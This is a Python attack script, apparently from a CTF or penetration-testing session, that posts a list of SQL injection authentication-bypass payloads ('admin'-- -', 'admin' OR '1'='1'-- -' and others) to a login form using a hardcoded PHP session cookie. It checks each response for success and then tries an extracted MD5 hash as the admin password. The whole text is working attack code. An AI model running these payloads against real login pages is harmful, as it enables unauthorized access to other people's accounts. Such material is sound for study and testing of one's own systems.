session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_auth(uname, pwd):
    """Send authentication request"""
    data = {
        "username": uname,
        "password": pwd,
        "submit": "submit"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        return response.text
    except:
        return None

print("[*] Testing authentication bypass with various payloads...")

# Testing different SQLi in username field
username_payloads = [
    "admin'-- -",
    "admin'#",
    "admin'; -- ",
    "admin' AND 1=1-- -",
    "admin' AND 1=2-- -",
    "admin')-- -",
    "admin')#",
    "admin'))-- -",
    'admin"-- -',
    'admin"#',
    "admin")-- -",
    "admin"))-- -",
    "admin' OR '1'='1'-- -",
    "admin' AND password='7d39307ae824e70052c0aa16816a9b16'-- -",
]

for payload in username_payloads:
    result = send_auth(payload, "password")
    print(f"Username='{payload[:40]}...', Password='password'")
    print(f"  -> {result}")
    if "Success" in result or "dashboard" in result.lower():
        print("  [*] SUCCESS!")
    time.sleep(0.2)

# What if the SQL query is doing: WHERE username = 'X' AND PASSWORD = 'Y' (literal string comparison)
# And the password field we're sending is being stored as-is?

print("\n[*] Testing if stored password is compared directly...")

# The extracted hash: 7d39307ae824e70052c0aa16816a9b16
# If the application does: SELECT * FROM users WHERE username='admin' AND password='[input]'
# Then password should be: 7d39307ae824e70052c0aa16816a9b16

result = send_auth("admin", "7d39307ae824e70052c0aa16816a9b16")
print(f"Username='admin', Password='7d39307ae824e70052c0aa16816a9b16'")
print(f"  -> {result}")

if result == '{"response":"password"}':
    print("  [!] This means: Username found (admin), but password DOES NOT match")
    print("  [!] The application is NOT doing direct string comparison")
    print("  [!] The application IS doing some transformation on the input password")
    print("  [!] Likely: MD5(input) == stored_value OR some other hash")

